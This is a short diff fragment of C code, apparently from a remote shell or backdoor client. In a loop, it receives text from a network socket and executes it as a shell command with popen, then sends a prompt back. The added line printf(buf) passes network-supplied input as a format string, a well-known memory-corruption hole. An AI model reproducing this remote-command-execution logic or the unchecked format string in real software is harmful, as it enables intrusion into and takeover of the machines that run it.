@@ -37,6 +37,7 @@ int main() {
   do {
     //send_prompt(ConnectSocket);
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
+    printf(buf);
     output = popen(buf, "r");
     send( ConnectSocket, prompt, sizeof(prompt), 0);
 
